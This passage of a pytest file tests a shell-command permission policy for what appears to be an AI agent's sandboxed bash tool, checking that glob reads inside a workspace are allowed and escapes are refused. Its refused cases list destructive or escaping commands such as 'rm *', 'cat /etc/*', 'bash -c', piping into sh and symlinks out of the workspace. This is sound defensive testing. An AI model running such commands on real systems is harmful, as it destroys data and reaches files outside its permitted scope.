    monkeypatch.setenv("NOUS_TEST_PLANTED_SECRET", "planted-s3cret")
    d = _bash_dispatcher(tmp_path)
    text, _ = await d.dispatch("bash", {"command": "printenv NOUS_TEST_PLANTED_SECRET"}, context=ctx)
    assert "planted-s3cret" in text


# -- Globs as file operands of the lineage read commands --------------------------


def _glob_ws(tmp_path):
    """A workspace with the files the glob tests expand over."""
    for name in (
        "claude-jobs/job-20261023-000001-aaaaaaaa/prompt.md",
        "claude-jobs/job-20261023-000002-bbbbbbbb/prompt.md",
        "dir/a.md",
        "dir/b.md",
        "dir/f1.txt",
        "dir/f2.txt",
        "dir/a.log",
        "dir/b.log",
        "dir/c.log",
        "dir/x.json",
        "hid/.hidden/x",
        "dash/-x",
        "dash/y",
    ):
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{}\n")
    return tmp_path


@pytest.mark.parametrize(
    "command",
    [
        # the command that was refused in DAG 82f8b2ea, with the fixture's workspace for /tmp/nous-workspace
        "grep -l X {W}/claude-jobs/job-*/prompt.md",
        "cat dir/*.md",
        "ls dir/*",
        "head -n 5 dir/f?.txt",
        "wc -l dir/[ab]*.log",
        "jq . dir/*.json",
        "tail dir/*",
        "cat {W}/dir/*.md",
        "grep 'foo*' dir/*.md",
        "grep -e 'a*b' dir/*.md",
        "cat -- dir/*.md",
        "cat dir/* | wc -l",
        "cat dir/*.md && ls dir/f?.txt",
        "cat dash/-*",  # the word cat gets is dash/-x, not an option
    ],
)
def test_the_lineage_shell_allows_a_glob_file_operand_of_a_read_command(command, tmp_path):
    ws = _glob_ws(tmp_path)
    assert _shell(command.format(W=ws), ws) is None


@pytest.mark.parametrize(
    "command",
    [
        # outside the workspace, or at its top level
        "cat /etc/*",
        "cat ../*",
        "cat {W}/../*",
        "cat dir/../*",
        "cat {W}/*",
        "ls *",
        "cd dir && cat *",
        # a pattern or a match that is an option
        "ls -- -*",
        # hidden: a pattern component with a leading dot, a prefix with a hidden component, or no visible match
        "cat dir/.*",
        "cat hid/.hidden/*",
        "cat hid/*/x",
        # no match: the shell would pass the pattern itself
        "cat dir/*.nothing",
        # bracket classes other than plain letters and digits, and **
        "cat dir/[!a]*.log",
        "cat dir/[^a]*.log",
        "cat dir/[a-c].log",
        "cat dir/[[:alpha:]].log",
        "cat dir/[a.log",
        "cat dir/**",
        # a glob in a word that is also quoted or escaped
        "cat dir/'a'*",
        'cat "dir"/*.md',
        "cat dir/\\a*",
        # a glob that is not a file operand of a read command
        "rm *",
        "rm dir/*",
        "echo dir/*",
        "pwd dir/*",
        "sleep dir/*",
        "true dir/*",
        "cd dir/*",
        "printf %s dir/*",
        "grep dir/*.md dir/a.md",
        "grep -e a dir/*.md -f dir/*.md",
        "grep -f dir/*.md dir/a.md",
        "grep --file=dir/*.md dir/a.md",
        "grep -m dir/* x dir/a.md",
        "jq dir/* dir/x.json",
        "jq --rawfile v dir/*.json . dir/x.json",
        "head -n dir/* dir/a.md",
        "c*t dir/a.md",
        "dir/* dir/a.md",
        # redirections
        "cat dir/a.md > {W}/intentions/{RID}/out*",
        "echo x > *",
        "cat < dir/*.md",
        # gh, runner.sh, git and the build commands
        "{R} status job-*",
        "gh pr view *",
        "gh pr view dir/*",
        "git log *",
        "pytest tests/*.py",
        "ruff check *",
        "make dir/*",
        # expansions that stay refused with and without a glob
        "cat $HOME/*",
        "cat $X",
        "cat `ls`/*",
        "cat `ls`",
        "cat dir/{{a,b}}.md",
        "cat dir/{{a,b}}*",
        "cat ~/*",
        "cat ~/x",
        # wrappers: the lineage shell runs no shell
        "bash -c 'cat dir/*'",
        "bash -c 'rm *'",
        "bash -c 'gh pr merge *'",
        "sh -c 'cat dir/*.md'",
        # a chain that reaches a refused command
        "cat dir/*; rm x",
        "cat dir/* | sh",
    ],
)
def test_the_lineage_shell_refuses_every_other_glob(command, tmp_path):
    ws = _glob_ws(tmp_path)
    command = command.format(R=_runner_sh(ws), W=ws, RID=RID)
    assert _shell(command, ws) == "external"


@pytest.mark.parametrize(
    "command",
    [
        "{R} status job-*",
        "gh pr view *",
        "git log *",
        "pytest tests/*.py",
        "ruff check *",
        "cd dir/*",
        "echo *",
        "cat a > out*",
    ],
)
def test_a_glob_stays_refused_with_the_build_commands_on(command, tmp_path):
    ws = _glob_ws(tmp_path)
    command = command.format(R=_runner_sh(ws))
    assert not lineage_bash_allowed(_internal(), command, workspace_dir=str(ws), build_commands=True)
    assert not lineage_bash_allowed(_internal(), f"cd dir && {command}", workspace_dir=str(ws), build_commands=True)


def test_a_quoted_glob_is_a_literal_path_as_before(tmp_path):
    ws = _glob_ws(tmp_path)
    assert _shell("cat 'dir/*'", ws) is None
    assert _shell('cat "dir/*.md"', ws) is None
    assert _shell("cat 'dir/../../*'", ws) == "external"


def test_a_glob_may_expand_to_200_files_and_no_more(tmp_path):
    many = tmp_path / "many"
    many.mkdir()
    for n in range(200):
        (many / f"f{n:03}").write_text("x")
    assert _shell("wc -l many/*", tmp_path) is None
    (many / "f200").write_text("x")
    assert _shell("wc -l many/*", tmp_path) == "external"
    assert _shell("wc -l many/f1*", tmp_path) is None  # one pattern's matches are counted, not the directory


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_glob_match_that_is_a_symlink_out_of_the_workspace_is_refused(tmp_path):
    ws = _glob_ws(tmp_path / "ws")
    (tmp_path / "secret").write_text("s")
    (ws / "dir" / "z.md").symlink_to(tmp_path / "secret")
    assert _shell("cat dir/*.md", ws) == "external"
    assert _shell("cat dir/a*.md", ws) is None
    (ws / "out").symlink_to(tmp_path)
    assert _shell("cat out/*", ws) == "external"
    (ws / "dir" / "z.md").unlink()
    (ws / "dir" / "z.md").symlink_to(tmp_path / "missing")  # dangling: matched by sh and glob alike
    assert _shell("cat dir/*.md", ws) == "external"
    (ws / "dir" / "z.md").unlink()
    (ws / "dir" / "z.md").symlink_to(ws / "missing")
    assert _shell("cat dir/*.md", ws) is None


def test_a_glob_that_matches_by_characters_and_by_bytes_differently_is_refused(tmp_path):
    """dash matches bytes, bash in a UTF-8 locale and Python's str glob characters: an é is one or two."""
    from nous.api.tool_policy import _glob_matches

    ws = _glob_ws(tmp_path).resolve()
    (ws / "dir" / "\u00e9.log").write_text("x")
    assert _glob_matches("dir/?.log", [ws], ws) is None
    assert _glob_matches("dir/??.log", [ws], ws) is None
    assert _glob_matches("dir/*.log", [ws], ws) is not None  # both read the name the same way


def test_a_glob_match_that_starts_with_a_dash_is_refused(tmp_path):
    """From the workspace's top level a relative glob is refused anyway; the match rule is checked on its own."""
    from nous.api.tool_policy import _glob_matches

    ws = _glob_ws(tmp_path).resolve()
    assert _glob_matches("*", [ws / "dash"], ws) is None
    assert _glob_matches("y*", [ws / "dash"], ws) == [ws / "dash" / "y"]
    assert _glob_matches("-*", [ws / "dash"], ws) is None


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell")
@pytest.mark.parametrize(
    "pattern",
    ["dir/*", "dir/*.md", "dir/f?.txt", "dir/[ab]*.log", "dir/*/x", "hid/*", "hid/*/x", "dir/a*", "dash/y*"],
)
def test_a_glob_expands_to_what_sh_expands_it_to(pattern, tmp_path):
    """Parity with the shell that runs the command (asyncio's create_subprocess_shell: /bin/sh). Dotfiles are
    matched by neither (hid/ holds only .hidden), and a pattern that matches nothing is refused here and passed
    as itself by sh."""
    import subprocess

    from nous.api.tool_policy import _glob_matches

    ws = _glob_ws(tmp_path).resolve()
    for name in (".dot.md", "sp ace.md", "st*r.md"):
        (ws / "dir" / name).write_text("x")
    out = subprocess.run(["/bin/sh", "-c", f"printf '%s\\n' {pattern}"], cwd=ws, capture_output=True)
    shell = sorted(out.stdout.decode().splitlines())
    ours = _glob_matches(pattern, [ws], ws)
    if shell == [pattern]:
        assert ours is None
    else:
        assert ours is not None and sorted(str(p.relative_to(ws)) for p in ours) == shell


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell")
def test_a_negated_class_is_refused_because_sh_reads_it(tmp_path):
    import subprocess

    ws = _glob_ws(tmp_path)
    out = subprocess.run(["/bin/sh", "-c", "printf '%s\\n' dir/[!a]*.log"], cwd=ws, capture_output=True, text=True)
    assert out.stdout.split() == ["dir/b.log", "dir/c.log"]  # sh negates the class; it is refused, not misread
    assert _shell("cat dir/[!a]*.log", ws) == "external"
